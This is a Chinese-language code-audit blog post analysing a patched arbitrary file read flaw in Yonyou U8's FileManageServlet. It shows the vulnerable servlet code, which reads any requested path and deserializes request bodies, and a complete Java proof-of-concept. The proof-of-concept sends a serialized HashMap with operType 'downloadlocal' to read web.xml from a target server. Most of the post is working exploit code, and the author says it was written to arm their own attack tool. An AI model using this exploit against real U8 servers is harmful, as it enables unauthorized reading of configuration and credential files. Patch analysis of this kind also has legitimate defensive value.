#  代码审计| U8 FileManageServlet 文件读取漏洞分析   
原创 莫大130  安全逐梦人   2025-05-24 04:36  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6yVSWIvtpaxOLmmsyWjSTyGibtI49d7iaYo9RhqS1azVEx5250U07f02wmfW0ypaSFe9OCnWWKG8Ww/640?wx_fmt=png&from=appmsg "")  
  
最近在写工具，分析官方漏洞补丁给自己的工具添加上一些day，这些day可能用不到，万一有一天用到了呢  
  
补丁链接 https://security.yonyou.com/#/noticeInfo?id=680  
#### 漏洞分析  
  
补丁代码 限制下载路径必须在 ${NCHome}/mpEA/  
 目录下，防止路径穿越攻击  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6yVSWIvtpaxOLmmsyWjSTySXYddRpEcAuib6icxKWY7DFMhLibuMU8vQ3XLwSNAxqlDIr5e1PNAFEGw/640?wx_fmt=png&from=appmsg "")  
  
  
存在漏洞的代码  
```
private voiddoDownLoadFileLocal(HashMap<String, Object> headInfo, HttpServletResponse response) {      Stringpath= (String)headInfo.get("path");      OutputStreamout=null;      InputStreamin=null;      try {          out = response.getOutputStream();          in = newFileInputStream(path);          byte[] b = newbyte[1024];          int len;          while((len = in.read(b)) > 0) {              response.getOutputStream().write(b, 0, len);          }          out.flush();      } catch (Exception var16) {          Logger.error(var16.getMessage(), var16);          var16.printStackTrace();      } finally {          try {              if (out != null) {                  out.close();              }              if (in != null) {                  in.close();              }          } catch (IOException var15) {              var15.printStackTrace();          }      }  }
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6yVSWIvtpaxOLmmsyWjSTy9knflO3D57xVNa9icib8RXeFwW14OJ9ytuN3o0Dds5GPbqWWib5BVSmCg/640?wx_fmt=png&from=appmsg "")  
  
doAction 构造参数进入doDownLoadFileLocal  
 方法，触发文件读取漏洞  
```
public voiddoAction(HttpServletRequest request, HttpServletResponse response)throws ServletException, IOException {      ObjectInputStreamin=null;      try {          in = newObjectInputStream(request.getInputStream());          HashMap<String, Object> headInfo = (HashMap)in.readObject();          StringdsName= (String)headInfo.get("dsName");          InvocationInfoProxy.getInstance().setUserDataSource(dsName);          Stringoper= (String)headInfo.get("operType");          if ("upload".equals(oper)) {              this.doUploadFile(headInfo, in, response);          } elseif ("download".equals(oper)) {              this.doDownLoadFile(headInfo, response);          } elseif ("downloadlocal".equals(oper)) {              this.doDownLoadFileLocal(headInfo, response);          }      } catch (Exception var10) {          var10.printStackTrace();      } finally {          if (in != null) {              in.close();          }      }  }
```  
  
进入  
doDownLoadFileLocal   
方法，主要在head头构造   
operType  
  
使用java来构造数据包和发送HTTP请求  
```
import java.io.*;  import java.net.HttpURLConnection;  import java.net.InetSocketAddress;  import java.net.Proxy;  import java.net.URL;  import java.util.HashMap;  publicclassMain {      publicstaticvoidmain(String[] args)throws Exception {          // 构造 payload        HashMap<String, Object> map = new HashMap<>();          map.put("dsName", "testDs");          map.put("operType", "downloadlocal");          map.put("path", "C:\\U8CERP50sp\\webapps\\u8c_web\\WEB-INF\\web.xml");  // 替换成你要读取的路径          // 设置代理地址和端口（Burp 默认是 127.0.0.1:8080）          Proxyproxy=newProxy(Proxy.Type.HTTP, newInetSocketAddress("192.168.1.101", 8080));          // 目标 URL        URL url = new URL("http://192.168.1.102:8089/service/FileManageServlet");          // 使用代理建立连接          HttpURLConnectionconn= (HttpURLConnection) url.openConnection(proxy);          conn.setDoOutput(true);          conn.setRequestMethod("POST");          conn.setRequestProperty("Content-Type", "application/octet-stream");          // 写入序列化对象          ObjectOutputStreamoos=newObjectOutputStream(conn.getOutputStream());          oos.writeObject(map);          oos.flush();          oos.close();          // 打印响应内容          BufferedReaderin=newBufferedReader(newInputStreamReader(conn.getInputStream()));          String line;          while ((line = in.readLine()) != null)              System.out.println(line);          in.close();      }  }
```  
  
为了方便，就使用java实现发包复现漏洞  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6yVSWIvtpaxOLmmsyWjSTyYSUia7y0jzibibVe3wfsJ9u9DVvzS5hiaJQaUy2pUrv0xVzRxuDIqB8ZcQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6yVSWIvtpaxOLmmsyWjSTyHyIV49NVl7wUom6CSWJHByftMrCFkqNVtGj6Yd40iaIhiczGXc23Jz7g/640?wx_fmt=png&from=appmsg "")  
  
  
